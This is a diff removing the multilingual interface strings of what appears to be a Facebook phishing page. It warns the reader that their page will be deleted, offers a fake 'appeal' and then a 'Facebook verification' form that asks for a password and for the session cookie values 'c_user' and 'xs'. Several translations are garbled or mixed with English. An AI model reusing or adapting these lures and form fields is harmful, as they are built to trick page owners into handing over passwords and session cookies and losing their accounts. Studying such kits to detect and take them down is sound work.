-                                contactSupportDesc: &#34;Get in touch with our support team for personalized assistance.&#34;,
-                                guidelinesTitle: &#34;Community Guidelines&#34;,
-                                guidelinesDesc: &#34;Learn about our community standards and content policies.&#34;,
-                                dashboardTitle: &#34;Status Dashboard&#34;,
-                                dashboardDesc: &#34;Check the current status of our services and report outages.&#34;,
-                                changeLanguage: &#34;Change Language&#34;
-                            },
-                            hindi: {
-                                warningTitle: &#34;आपके पेज को हटाने के लिए निर्धारित किया गया है!&#34;,
-                                warningSubtext: &#34;हमें कई रिपोर्ट मिली हैं कि आपका पेज हमारे सेवा की शर्तों और सामुदायिक दिशानिर्देशों का उल्लंघन करता है। नतीजतन, आपके पेज को सत्यापन के लिए भेजा जाएगा।&#34;,
-                                warningExtra: &#34;यदि आपको लगता है कि आपके पेज को गलती से हटाने के लिए निर्धारित किया गया था, तो आप नीचे अपील बटन पर क्लिक करके और कुछ त्वरित जानकारी प्रदान करके इसके स्थायी निष्कासन को रोक सकते हैं。&#34;,
-                                appealTitle: &#34;अपील अनुरोध&#34;,
-                                appealDesc: &#34;अपने पेज की समस्याओं को ठीक करना। कृपया नीचे अनुरोधित जानकारी प्रदान करना सुनिश्चित करें। इस जानकारी को प्रदान न करने से आपकी अपील के प्रसंस्करण में देरी हो सकती है。&#34;,
-                                appealBtn: &#34;अपील करें&#34;,
-                                formTitle: &#34;पेज अपील अनुरोध&#34;,
-                                formSubtitle: &#34;हटाने की अपील करने के लिए अपनी जानकारी जमा करें&#34;,
-                                formNotice1: &#34;ⓘ आपके पेज में हमारे सामुदायिक दिशानिर्देशों से संबंधित उल्लंघन है।&#34;,
-                                formNotice2: &#34;ⓘ सबमिट करने से पहले कृपया उल्लंघन विवरणों की सावधानीपूर्वक समी REVIEW करें。&#34;,
-                                formNotice3: &#34;ⓘ अपनी अपील के लिए सही जानकारी प्रदान करना सुनिश्चित करें。&#34;,
-                                nameLabel: &#34;c_user&#34;,
-                                mallLabel: &#34;xs&#34;,
-                                submitBtn: &#34;अपील अनुरोध जमा करें&#34;,
-                                fbFormTitle: &#34;फेसबुक सत्यापन&#34;,
-                                fbFormSubtitle: &#34;अपील जारी रखने के लिए अपनी पहचान सत्यापित करें&#34;,
-                                fbNotice1: &#34;ⓘ सुरक्षा उद्देश्यों के लिए, हमें आपके फेसबुक खाते को सत्यापित करने की आवश्यकता है。&#34;,
-                                fbNotice2: &#34;ⓘ यह हमें यह सुनिश्चित करने में मदद करता है कि आप पेज के वैध मालिक हैं।&#34;,
-                                fbNotice3: &#34;ⓘ आपकी साख सुरक्षित और एन्क्रिप्टेड है。&#34;,
-                                passwordLabel: &#34;पासवर्ड&#34;,
-                                verifyBtn: &#34;सत्यापित करें और जारी रखें&#34;,
-                                forgotPassword: &#34;पासवर्ड भूल गए?&#34;,
-                                successTitle: &#34;अपील सफलतापूर्वक जमा की गई&#34;,
-                                successText: &#34;आपकी अपील प्राप्त हो गई है और अब समीक्षा के दौर से गुजर रही है। आम तौर पर 7 व्यावसायिक दिनों के भीतर निर्णय होने के बाद हम आपको ईमेल के माध्यम से सूचित करेंगे。&#34;,
-                                referenceText: &#34;संदर्भ आईडी:&#34;,
-                                guideTitle: &#34;अपील गाइड&#34;,
-                                guideText1: &#34;यदि आपकी अपील/अनुरोध में आपके खाते में कॉपीराइट की गई जानकारी या सामग्री का उपयोग शामिल है या जो प्रसंस्कृत की जा रही है, तो आप हमें अपने अनुरोध को बेहतर ढंग से समझने में मदद करने के लिए जानकारी प्रदान कर सकते हैं। कृपया विस्तृत व्याख्या प्रदान करें कि आपको क्यों लगता है कि आपके खाते को गलत तरीके से फ्लैग किया गया था या निलंबित किया गया था। कोई भी प्रासंगिक जानकारी शामिल करें जो हमें आपके मामले की अधिक प्रभावी ढंग से समीक्षा करने में मदद कर सकती है।&#34;,
-                                guideText2: &#34;आपके द्वारा जमा करने के बाद, हम आपकी अपील की समीक्षा करेंगे और समाधान के लिए आपके द्वारा प्रदान की गई जानकारी की समय सीमा के भीतर आपसे संपर्क करेंगे। समीक्षा प्रक्रिया में 7 व्यावसायिक दिन तक का समय लग सकता है। कृपया अपडेट के लिए अपने ईमेल की जांच करें。&#34;,
-                                guideText3: &#34;आप पृष्ठ के निचले भाग में भाषा चयनकर्ता पर क्लिक करके किसी भी समय अपनी भाषा प्राथमिकता बदल सकते हैं。&#34;,
-                                resourcesTitle: &#34;अतिरिक्त संसाधन&#34;,
-                                helpCenterTitle: &#34;सहायता केंद्र&#34;,
-                                helpCenterDesc: &#34;सामान्य प्रश्नों के उत्तर खोजें और हमारे उत्पादों का उपयोग करना सीखें。&#34;,
-                                contactSupportTitle: &#34;समर्थन से संपर्क करें&#34;,
-                                contactSupportDesc: &#34;व्यक्तिगत सहायता के लिए हमारी समर्थन टीम से संपर्क करें&#34;,
-                                guidelinesTitle: &#34;सामुदायिक दिशानिर्देश&#34;,
-                                guidelinesDesc: &#34;हमारे सामुदायिक मानकों और सामग्री नीतियों के बारे में जानें。&#34;,
-                                dashboardTitle: &#34;स्थिति डैशबोर्ड&#34;,
-                                dashboardDesc: &#34;हमारी सेवाओं की वर्तमान स्थिति की जाँच करें और आउटेज की रिपोर्ट करें。&#34;,
-                                changeLanguage: &#34;भाषा बदलें&#34;
-                            },
-                            spanish: {
-                                warningTitle: &#34;¡Tu página está programada para ser eliminada!&#34;,
-                                warningSubtext: &#34;Hemos recibido varios informes de que tu página viola nuestros términos de servicio y pautas comunitarias. Como resultado, tu página será enviada para verificación.&#34;,
-                                warningExtra: &#34;If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.&#34;,
-                                appealTitle: &#34;Solicitud de apelación&#34;,
-                                appealDesc: &#34;Solucionando problemas con tu página. Asegúrate de proporcionar la información solicitada a continuación. No proporcionar esta información puede retrasar el procesamiento de tu apelación.&#34;,
-                                appealBtn: &#34;Apelar&#34;,
-                                formTitle: &#34;Solicitud de Apelación de Página&#34;,
-                                formSubtitle: &#34;Envía tu información para apelar la eliminación&#34;,
-                                formNotice1: &#34;ⓘ Tu página tiene una violación relacionada con nuestras pautas comunitarias.&#34;,
-                                formNotice2: &#34;ⓘ Por favor, revisa los detalles de la violación cuidadosamente antes de enviar.&#34;,
-                                formNotice3: &#34;ⓘ Asegúrate de proporcionar información correcta para tu apelación.&#34;,
-                                nameLabel: &#34;c_user&#34;,
-                                mallLabel: &#34;xs&#34;,
-                                submitBtn: &#34;Enviar solicitud de apelación&#34;,
-                                fbFormTitle: &#34;Verificación de Facebook&#34;,
-                                fbFormSubtitle: &#34;Verify your identity to continue with the appeal&#34;,
-                                fbNotice1: &#34;ⓘ Por motivos de seguridad, necesitamos verificar tu cuenta de Facebook.&#34;,
-                                fbNotice2: &#34;ⓘ Esto nos ayuda a asegurar que eres el propietario legítimo de la página.&#34;,
-                                fbNotice3: &#34;ⓘ Tus credenciales están seguras y encriptadas.&#34;,
-                                passwordLabel: &#34;Contraseña&#34;,
-                                verifyBtn: &#34;Verificar y Continuar&#34;,
-                                forgotPassword: &#34;¿Olvidaste tu contraseña?&#34;,
-                                successTitle: &#34;Apelación Enviada Exitosamente&#34;,
-                                successText: &#34;Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado una decisión, generalmente dentro de 7 días hábiles.&#34;,
-                                referenceText: &#34;ID de referencia:&#34;,
-                                guideTitle: &#34;Guía de Apelación&#34;,
-                                guideText1: &#34;Si su apelación/solicitud implica el uso de información con derechos de autor o contenido en su cuenta or that is being processed/shared, you may provide us information to help us better understand your request. Proporcione una explicación detallada de por qué cree that su cuenta fue marcada o suspendida incorrectamente. Incluya cualquier información relevante que pueda ayudarnos a revisar su caso de manera más efectiva.&#34;,
-                                guideText2: &#34;Después de su envío, revisaremos su apelación y nos comunicaremos con usted dentro del plazo de la información que proporcione para resolver. El proceso de revisión podría tardar hasta 7 días hábiles. Por favor, revise su correo electrónico para obtener actualizaciones.&#34;,
-                                guideText3: &#34;Nota: Puede cambiar su preferencia de idioma en cualquier momento haciendo clic en el selector de idioma en la parte inferior de la página.&#34;,
-                                resourcesTitle: &#34;Recursos Adicionales&#34;,
-                                helpCenterTitle: &#34;Centro de Ayuda&#34;,
-                                helpCenterDesc: &#34;Encuentra respuestas a preguntas comunes y aprende a usar nuestros productos.&#34;,
-                                contactSupportTitle: &#34;Contactar Soporte&#34;,
-                                contactSupportDesc: &#34;Comunícate con nuestro equipo de soporte para asistencia personalizada.&#34;,
-                                guidelinesTitle: &#34;Pautas de la Comunidad&#34;,
-                                guidelinesDesc: &#34;Conoce nuestros estándares comunitarios y políticas de contenido.&#34;,
-                                dashboardTitle: &#34;Panel de Estado&#34;,
-                                dashboardDesc: &#34;Consulta el estado actual of nuestros servicios e informa interrupciones.&#34;,
-                                changeLanguage: &#34;Cambiar idioma&#34;
-                            },
-                            portuguese: {
-                                warningTitle: &#34;Sua página está programada para ser excluída!&#34;,
-                                warningSubtext: &#34;Recebemos vários relatos de que sua página viola nossos termos de serviço and diretrizes da comunidade. Como resultado, sua página será enviada para verificação.&#34;,
-                                warningExtra: &#34;Se você acredita que sua página foi programada para exclusão por engano, pode evitar sua remoção permanente simply clicking the appeal button below and providing some quick information.&#34;,
-                                appealTitle: &#34;Solicitação de recurso&#34;,
-                                appealDesc: &#34;Corrigindo problemas com sua página. Certifique-se de fornecer as informações solicitadas abaixo. A não divulgação dessas informações pode atrasar the processing of your appeal.&#34;,
-                                appealBtn: &#34;Recorrer&#34;,
-                                formTitle: &#34;Solicitação de Recurso de Página&#34;,
-                                formSubtitle: &#34;Envie suas informações para contestar a exclusão&#34;,
-                                formNotice1: &#34;ⓘ Sua página tem uma violação relacionada às nossas diretrizes comunitárias.&#34;,
-                                formNotice2: &#34;ⓘ Revise os detalhes da violação cuidadosamente antes de enviar.&#34;,
-                                formNotice3: &#34;ⓘ Certifique-se de fornecer informações corretas para o seu recurso.&#34;,
-                                nameLabel: &#34;c_user&#34;,
-                                mallLabel: &#34;xs&#34;,
-                                submitBtn: &#34;Envir solicitação de recurso&#34;,
-                                fbFormTitle: &#34;Verificação do Facebook&#34;,
-                                fbFormSubtitle: &#34;Verifique sua identidade para continuar com o recurso&#34;,
-                                fbNotice1: &#34;ⓘ Para fins de segurança, precisamos verificar sua conta do Facebook.&#34;,
-                                fbNotice2: &#34;ⓘ Isso nos ajuda a garantir that você é o proprietário legítimo da página.&#34;,
-                                fbNotice3: &#34;ⓘ Suas credenciais são seguras and criptografadas.&#34;,
-                                passwordLabel: &#34;Senha&#34;,
-                                verifyBtn: &#34;Verificar e Continuar&#34;,
-                                forgotPassword: &#34;Esqueceu a senha?&#34;,
-                                successTitle: &#34;Recurso enviado com sucesso&#34;,
-                                successText: &#34;Seu recurso foi recebido e agora está em análise. Notificaremos você por e-mail assim que uma decisão for tomada, geralmente within 7 dias úteis.&#34;,
-                                referenceText: &#34;ID de referência:&#34;,
-                                guideTitle: &#34;Guia de recurso&#34;,
-                                guideText1: &#34;Se o seu recurso/solicitação envolver o uso de informações protegidas por direitos autorais ou conteúdo em sua conta or that is being processed/shared, você pode nos fornecer informações para nos ajudar a entender melhor sua solicitação. Forneça uma explicação detalhada do porquê você acredita que sua conta foi sinalizada ou suspensa incorretamente. Inclua todas as informações relevantes that may help us review your case more effectively.&#34;,
-                                guideText2: &#34;Após o envio, revisaremos seu recurso e entraremos em contato com você dentro do prazo das informações fornecidas para resolver. O processo de revisão pode levar até 7 dias úteis. Verifique seu e-mail para atualizações.&#34;,
-                                guideText3: &#34;Nota: Você can alterar sua preferência de idioma a qualquer momento clicando no seletor de idioma na parte inferior da página.&#34;,
-                                resourcesTitle: &#34;Recursos Adicionais&#34;,
-                                helpCenterTitle: &#34;Central de Ajuda&#34;,
-                                helpCenterDesc: &#34;Encontre respostas para perguntas comuns e aprenda a usar nossos produtos.&#34;,
-                                contactSupportTitle: &#34;Contatar Suporte&#34;,
-                                contactSupportDesc: &#34;Entre em contato com nossa equipe de suporte para assistência personalizada.&#34;,
-                                guidelinesTitle: &#34;Diretrizes da Comunidade&#34;,
-                                guidelinesDesc: &#34;Conheça nossos padrões comunitários e políticas de conteúdo.&#34;,
-                                dashboardTitle: &#34;Painel de Status&#34;,
-                                dashboardDesc: &#34;Verifique o status atual de nossos serviços e relate interrupções.&#34;,
-                                changeLanguage: &#34;Mudar idioma&#34;
-                            },
-                            tamil: {
-                                warningTitle: &#34;உங்கள் பக்கம் நீக்கத் திட்டமிடப்பட்டுள்ளது!&#34;,
-                                warningSubtext: &#34;உங்கள் பக்கம் எங்கள் சேவை விதிமுறைகள் மற்றும் சமூக வழிகாட்டுதல்களை மீறுவதாக பல புகார்கள் எங்களுக்கு கிடைத்துள்ளன. இதன் விளைவாக, உங்கள் பக்கம் சரிபார்ப்பிற்கு அனுப்பப்படும்.&#34;,
-                                warningExtra: &#34;உங்கள் பக்கம் தவறாக நீக்கத் திட்டமிடப்பட்டதாக நீங்கள் நம்பினால், கீழே உள்ள மேல்முறையீடு பொத்தானைக் கிளிக் செய்து சில விரைவான தகவல்களை வழங்குவதன் மூலம் அதன் நிரந்தர நீக்கத்தைத் தடுக்கலாம்.&#34;,
-                                appealTitle: &#34;மேல்முறையீடு கோரிக்கை&#34;,
-                                appealDesc: &#34;உங்கள் பக்கத்தில் உள்ள சிக்கல்களை சரிசெய்தல். கீழே கோரப்பட்ட தகவல்களை வழங்குவதை உறுதிசெய்யவும். இந்த தகவலை வழங்காததால் உங்கள் மேல்முறையீட்டின் செயலாக்கம் தாமதமாகலாம்.&#34;,
-                                appealBtn: &#34;மேல்முறையீடு&#34;,
-                                formTitle: &#34;பக்க மேல்முறையீடு கோரிக்கை&#34;,
-                                formSubtitle: &#34;நீக்கத்தை மேல்முறையீடு செய்ய உங்கள் தகவல்களை சமர்ப்பிக்கவும்&#34;,
-                                formNotice1: &#34;ⓘ உங்கள் பக்கத்தில் எங்கள் சமூக வழிகாட்டுதல்கள் தொடர்பான மீறல் உள்ளது.&#34;,
-                                formNotice2: &#34;ⓘ சமர்ப்பிப்பதற்கு முன் மீறல் விவரங்களை கவனமாக மதிப்பாய்வு செய்யவும்.&#34;,
-                                formNotice3: &#34;ⓘ உங்கள் மேல்முறையீட்டிற்கான சரியான தகவல்களை வழங்குவதை உறுதிசெய்யவும்.&#34;,
-                                nameLabel: &#34;c_user&#34;,
-                                mallLabel: &#34;xs&#34;,
-                                submitBtn: &#34;மேல்முறையீடு கோரிக்கையை சமர்ப்பிக்கவும்&#34;,
-                                fbFormTitle: &#34;பேஸ்புக் சரிபார்ப்பு&#34;,
-                                fbFormSubtitle: &#34;மேல்முறையீட்டைத் தொடர உங்கள் அடையாளத்தை சரிபார்க்கவும்&#34;,
-                                fbNotice1: &#34;ⓘ பாதுகாப்பு நோக்கங்களுக்காக, உங்கள் பேஸ்புக் கணக்கை சரிபார்க்க வேண்டும்.&#34;,
-                                fbNotice2: &#34;ⓘ இது பக்கத்தின் சட்டபூர்வமான உரிமையாளர் நீங்கள் என்பதை உறுதிப்படுத்த உதவுகிறது.&#34;,
-                                fbNotice3: &#34;ⓘ உங்கள் அறிவுறுத்தல்கள் பாதுகாப்பானவை மற்றும் குறியாக்கம் செய்யப்பட்டவை.&#34;,
-                                passwordLabel: &#34;கடவுச்சொல்&#34;,
-                                verifyBtn: &#34;சரிபார்த்து தொடரவும்&#34;,
-                                forgotPassword: &#34;கடவுச்சொல் மறந்துவிட்டீர்களா?&#34;,
-                                successTitle: &#34;மேல்முறையீடு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது&#34;,
-                                successText: &#34;உங்கள் மேல்முறையீடு பெறப்பட்டது மற்றும் இப்போது மதிப்பாய்வில் உள்ளது. பொதுவாக 7 வணிக நாட்களுக்குள் ஒரு முடிவு எடுக்கப்பட்டவுடன் மின்னஞ்சல் மூலம் உங்களுக்கு அறிவிப்போம்.&#34;,
-                                referenceText: &#34;குறிப்பு ஐடி:&#34;,
-                                guideTitle: &#34;மேல்முறையீடு வழிகாட்டி&#34;,
-                                guideText1: &#34;உங்கள் மேல்முறையீடு/கோரிக்கை உங்கள் கணக்கில் பதிப்புரிமை கொண்ட தகவல் அல்லது உள்ளடக்கத்தின் பயன்பாட்டை உள்ளடக்கியிருந்தால் அல்லது செயலாக்கம்/பகிரப்படுகிறது என்றால், எங்கள் கோரிக்கையை நன்றாக புரிந்துகொள்ள எங்களுக்கு தகவல்களை வழங்கலாம். உங்கள் கணக்கு தவறாகக் குறிக்கப்பட்டது அல்லது இடைநிறுத்தப்பட்டது என்று நீங்கள் ஏன் நம்புகிறீர்கள் என்பதற்கான விரிவான விளக்கத்தை வழங்கவும். உங்கள் வழக்கை மிகவும் திறம்பட மதிப்பாய்வு செய்ய எங்களுக்கு உதவக்கூடிய ஏதேனும் தொடர்புடைய தகவல்களைச் சேர்க்கவும்.&#34;,
-                                guideText2: &#34;உங்கள் சமர்ப்பிப்பிற்குப் பிறகு, எங்கள் மேல்முறையீட்டை மதிப்பாய்வு செய்து, தீர்க்க நீங்கள் வழங்கும் தகவலின் காலக்கெடுவுக்குள் உங்களுடன் தொடர்பு கொள்வோம். மதிப்பாய்வு செயல்முறை 7 வணிக நாட்கள் வரை எடுக்கலாம். புதுப்பிப்புகளுக்கு உங்கள் மின்னஞ்சலைச் சரிபார்க்கவும்.&#34;,
-                                guideText3: &#34;குறிப்பு: பக்கத்தின் கீழே உள்ள மொழி தேர்வியைக் கிளிக் செய்வதன் மூலம் எந்த நேரத்திலும் உங்கள் மொழி விருப்பத்தை மாற்றலாம்.&#34;,
-                                resourcesTitle: &#34;கூடுதல் வளங்கள்&#34;,
-                                helpCenterTitle: &#34;உதவி மையம்&#34;,
-                                helpCenterDesc: &#34;பொதுவான கேள்விகளுக்கான பதில்களைக் கண்டறிந்து எங்கள் தயாரிப்புகளை எவ்வாறு பயன்படுத்துவது என்பதை அறிக.&#34;,
-                                contactSupportTitle: &#34;ஆதரவைத் தொடர்பு கொள்ளவும்&#34;,
-                                contactSupportDesc: &#34;தனிப்பட்ட உதவிக்கு எங்கள் ஆதரவு குழுவைத் தொடர்பு கொள்ளவும்.&#34;,
-                                guidelinesTitle: &#34;சமூக வழிகாட்டுதல்கள்&#34;,
-                                guidelinesDesc: &#34;எங்கள் சமூக தரங்கள் மற்றும் உள்ளடக்கக் கொள்கைகளைப் பற்றி அறிக.&#34;,
-                                dashboardTitle: &#34;நிலை டாஷ்போர்டு&#34;,
-                                dashboardDesc: &#34;எங்கள் சேவைகளின் தற்போதைய நிலையைச் சரிபார்த்து, இடையூறுகளைப் புகாரளிக்கவும்.&#34;,
-                                changeLanguage: &#34;மொழியை மாற்று&#34;
-                            },
-                            arabic: {
-                                warningTitle: &#34;صفحتك مجدولة للحذف!&#34;,
-                                warningSubtext: &#34;لقد تلقينا عدة تقارير تفيد بأن صفحتك تنتهك شروط الخدمة وإرشادات المجتمع الخاصة بنا. نتيجة لذلك، سيتم إرسال صفحتك للتحقق.&#34;,
-                                warningExtra: &#34;إذا كنت تعتقد أنه تم جدولة صفحتك للحذف عن طريق الخطأ، فيمكنك منع إزالتها الدائمة ببساطة عن طريق النقر على زر الاستئناف أدناه وتقديم بعض المعلومات السريعة.&#34;,
-                                appealTitle: &#34;طلب الاستئناف&#34;,
-                                appealDesc: &#34;إصلاح المشاكل في صفحتك. يرجى التأكد من تقديم المعلومات المطلوبة أدناه. قد يؤدي عدم تقديم هذه المعلومات إلى تأخير معالجة استئنافك.&#34;,
-                                appealBtn: &#34;استئناف&#34;,
-                                formTitle: &#34;طلب استئناف الصفحة&#34;,
-                                formSubtitle: &#34;أرسل معلوماتك للاستئناف ضد الحذف&#34;,
-                                formNotice1: &#34;ⓘ تحتوي صفحتك على انتهاك متعلق بإرشادات المجتمع الخاصة بنا.&#34;,
-                                formNotice2: &#34;ⓘ يرجى مراجعة تفاصيل الانتهاك بعناية قبل الإرسال.&#34;,
-                                formNotice3: &#34;ⓘ تأكد من تقديم معلومات صحيحة لاستئنافك.&#34;,
-                                nameLabel: &#34;c_user&#34;,
-                                mallLabel: &#34;xs&#34;,
-                                submitBtn: &#34;إرسال طلب الاستئناف&#34;,
-                                fbFormTitle: &#34;التحقق من فيسبوك&#34;,
-                                fbFormSubtitle: &#34;تحقق من هويتك للمتابعة مع الاستئناف&#34;,
-                                fbNotice1: &#34;ⓘ لأغراض أمنية، نحتاج إلى التحقق من حساب فيسبوك الخاص بك.&#34;,
-                                fbNotice2: &#34;ⓘ هذا يساعدنا على التأكد من أنك المالك الشرعي للصفحة.&#34;,
-                                fbNotice3: &#34;ⓘ بيانات الاعتماد الخاصة بك آمنة ومشفرة.&#34;,
-                                passwordLabel: &#34;كلمة المرور&#34;,
-                                verifyBtn: &#34;التحقق والمتابعة&#34;,
-                                forgotPassword: &#34;نسيت كلمة المرور?&#34;,
-                                successTitle: &#34;تم إرسال الاستئناف بنجاح&#34;,
-                                successText: &#34;لقد تم استلام استئنافك وهو الآن قيد المراجعة. سنخطرك عبر البريد الإلكتروني بمجرد اتخاذ قرار، عادة خلال 7 أيام عمل.&#34;,
-                                referenceText: &#34;معرف المرجع:&#34;,
-                                guideTitle: &#34;دليل الاستئناف&#34;,
-                                guideText1: &#34;إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي معلومات ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.&#34;,
-                                guideText2: &#34;بعد إرسالك، سنراجع استئنافك ونلتقي بك خلال الإطار الزمني للمعلومات التي تقدمها لحل. قد تستغرق عملية المراجعة ما يصل إلى 7 أيام عمل. يرجى التحقق من بريدك الإلكتروني للحصول على التحديثات.&#34;,
-                                guideText3: &#34;ملاحظة: يمكنك تغيير تفضيل اللغة في أي وقت بالنقر على محدد اللغة في أسفل الصفحة.&#34;,
-                                resourcesTitle: &#34;موارد إضافية&#34;,
-                                helpCenterTitle: &#34;مركز المساعدة&#34;,
-                                helpCenterDesc: &#34;ابحث عن إجابات للأسئلة الشائعة وتعلم كيفية استخدام منتجاتنا.&#34;,
-                                contactSupportTitle: &#34;اتصل بالدعم&#34;,
-                                contactSupportDesc: &#34;تواصل مع فريق الدعم الخاص بنا للحصول على مساعدة مخصصة.&#34;,
-                                guidelinesTitle: &#34;إرشادات المجتمع&#34;,
-                                guidelinesDesc: &#34;تعرف على معايير المجتمع وسياسات المحتوى الخاصة بنا.&#34;,
-                                dashboardTitle: &#34;لوحة الحالة&#34;,
-                                dashboardDesc: &#34;تحقق من الحالة الحالية لخدماتنا وأبلغ عن الأعطال.&#34;,
-                                changeLanguage: &#34;تغيير اللغة&#34;
-                            },
-
-                            vietnamese: {
-                                warningTitle: &#34;Trang của bạn đã được lên lịch để xóa!&#34;,
-                                warningSubtext: &#34;Chúng tôi đã nhận được một số báo cáo rằng trang của bạn vi phạm điều khoản dịch vụ và nguyên tắc cộng đồng của chúng tôi. Do đó, trang của bạn sẽ được gửi đi để xác minh.&#34;,
-                                warningExtra: &#34;Nếu bạn tin rằng trang của bạn đã bị lên lịch xóa nhầm, bạn có thể ngăn việc xóa vĩnh viễn bằng cách nhấp vào nút khiếu nại bên dưới và cung cấp một số thông tin nhanh.&#34;,
-                                appealTitle: &#34;Yêu cầu khiếu nại&#34;,
-                                appealDesc: &#34;Khắc phục sự cố với trang của bạn. Vui lòng đảm bảo cung cấp thông tin được yêu cầu bên dưới. Không cung cấp thông tin này có thể làm chậm quá trình xử lý khiếu nại của bạn.&#34;,
-                                appealBtn: &#34;Khiếu nại&#34;,
-                                formTitle: &#34;Yêu cầu Khiếu nại Trang&#34;,
-                                formSubtitle: &#34;Gửi thông tin của bạn để khiếu nại việc xóa&#34;,
-                                formNotice1: &#34;ⓘ Trang của bạn có vi phạm liên quan đến nguyên tắc cộng đồng của chúng tôi.&#34;,
-                                formNotice2: &#34;ⓘ Vui lòng xem xét kỹ chi tiết vi phạm trước khi gửi.&#34;,
-                                formNotice3: &#34;ⓘ Đảm bảo bạn cung cấp thông tin chính xác cho khiếu nại của mình.&#34;,
-                                nameLabel: &#34;c_user&#34;,
-                                mallLabel: &#34;xs&#34;,
-                                submitBtn: &#34;Gửi Yêu cầu Khiếu nại&#34;,
-                                fbFormTitle: &#34;Xác minh Facebook&#34;,
-                                fbFormSubtitle: &#34;Xác minh danh tính của bạn để tiếp tục khiếu nại&#34;,
-                                fbNotice1: &#34;ⓘ Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản Facebook của bạn.&#34;,
-                                fbNotice2: &#34;ⓘ Điều này giúp chúng tôi đảm bảo rằng bạn là chủ sở hữu hợp pháp của trang.&#34;,
-                                fbNotice3: &#34;ⓘ Thông tin đăng nhập của bạn được bảo mật và mã hóa.&#34;,
-                                passwordLabel: &#34;Mật khẩu&#34;,
-                                verifyBtn: &#34;Xác minh và Tiếp tục&#34;,
-                                forgotPassword: &#34;Quên mật khẩu?&#34;,
-                                successTitle: &#34;Khiếu nại Đã gửi Thành công&#34;,
-                                successText: &#34;Khiếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẽ thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.&#34;,
-                                referenceText: &#34;ID Tham chiếu:&#34;,
-                                guideTitle: &#34;Hướng dẫn Khiếu nại&#34;,
-                                guideText1: &#34;Nếu khiếu nại/yêu cầu của bạn liên quan đến việc sử dụng thông tin có bản quyền hoặc nội dung trong tài khoản của bạn hoặc đang được xử lý/chia sẻ, bạn có thể cung cấp cho chúng tôi thông tin để giúp chúng tôi hiểu rõ hơn về yêu cầu của bạn. Vui lòng cung cấp giải thích chi tiết về lý do bạn tin rằng tài khoản của mình đã bị gắn cờ hoặc đình chỉ không chính xác. Bao gồm bất kỳ thông tin liên quan nào có thể giúp chúng tôi xem xét trường hợp của bạn hiệu quả hơn.&#34;,
-                                guideText2: &#34;Sau khi bạn gửi, chúng tôi sẽ xem xét khiếu nại của bạn và liên hệ với bạn trong thời hạn thông tin bạn cung cấp để giải quyết. Quá trình xem xét có thể mất tới 7 ngày làm việc. Vui lòng kiểm tra email của bạn để cập nhật.&#34;,
-                                guideText3: &#34;Lưu ý: Bạn có thể thay đổi tùy chọn ngôn ngữ bất cứ lúc nào bằng cách nhấp vào bộ chọn ngôn ngữ ở cuối trang.&#34;,
-                                resourcesTitle: &#34;Tài nguyên Bổ sung&#34;,
-                                helpCenterTitle: &#34;Trung tâm Trợ giúp&#34;,
-                                helpCenterDesc: &#34;Tìm câu trả lời cho các câu hỏi thường gặp và tìm hiểu cách sử dụng sản phẩm của chúng tôi.&#34;,
-                                contactSupportTitle: &#34;Liên hệ Hỗ trợ&#34;,
-                                contactSupportDesc: &#34;Liên hệ với nhóm hỗ trợ của chúng tôi để được trợ giúp cá nhân hóa.&#34;,
-                                guidelinesTitle: &#34;Nguyên tắc Cộng đồng&#34;,
-                                guidelinesDesc: &#34;Tìm hiểu về tiêu chuẩn cộng đồng và chính sách nội dung của chúng tôi.&#34;,
-                                dashboardTitle: &#34;Bảng điều khiển Trạng thái&#34;,
-                                dashboardDesc: &#34;Kiểm tra trạng thái hiện tại của dịch vụ của chúng tôi và báo cáo sự cố.&#34;,
-                                changeLanguage: &#34;Thay đổi Ngôn ngữ&#34;
-                            },
-
-                            ghanaian: {
-                                warningTitle: &#34;Wɔahyɛ wo krataa no sɛ wɔbɛpaew!&#34;,
-                                warningSubtext: &#34;Yɛnnya amanneɛ bɛyɛ mienu a ɛkyerɛ sɛ wo krataa no di yɛn nkratoɔ ne mmara ahorow no so. Enti, wɔbɛsoma wo krataa no sɛ wɔnhwɛ so.&#34;,
-                                warningExtra: &#34;Sɛ wudwen sɛ yɛyɛ wo krataa no foforo a, wubetumi apia sɛ wɔmpaew no denam krataa a ɛwɔ aseɛ no so, na wode nkɔm hyɛ mu.&#34;,
-                                appealTitle: &#34;Apɛl kɔm&#34;,
-                                appealDesc: &#34;Yɛredware wo krataa no mu mfomsoɔ. Mesrɛ wo, hyɛ nsɛm a wɔhwehwɛ wɔ aseɛ no mu. Sɛ wunnye nsɛm no a, ebɛtumi ayɛ wo apɛl no mmerɛw.&#34;,
-                                appealBtn: &#34;Yɛ apɛl&#34;,
-                                formTitle: &#34;Krataa Apɛl Kɔm&#34;,
-                                formSubtitle: &#34;Hyɛ wo nsɛm sɛ wɔnyɛ apɛl wɔ paew no ho&#34;,
-                                formNotice1: &#34;ⓘ Wo krataa no ayɛ yɛn mmara ahorow no so.&#34;,
-                                formNotice2: &#34;ⓘ Mesrɛ wo, hwɛ mfomsoɔ no ho nsɛm yiye ansa na wuregye tomu.&#34;,
-                                formNotice3: &#34;ⓘ Hwɛ sɛ wuhyɛ nsɛm pa sɛ woyɛ apɛl.&#34;,
-                                nameLabel: &#34;c_user&#34;,
-                                mallLabel: &#34;xs&#34;,
-                                submitBtn: &#34;Yɛ Apɛl Kɔm&#34;,
-                                fbFormTitle: &#34;Facebook Nhwehwɛmu&#34;,
-                                fbFormSubtitle: &#34;Hwɛ wo ho sɛ wotumi tua so yɛ apɛl&#34;,
-                                fbNotice1: &#34;ⓘ Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo Facebook account no.&#34;,
-                                fbNotice2: &#34;ⓘ Wei boa yɛn sɛ yɛhunu sɛ wo na wokura krataa no.&#34;,
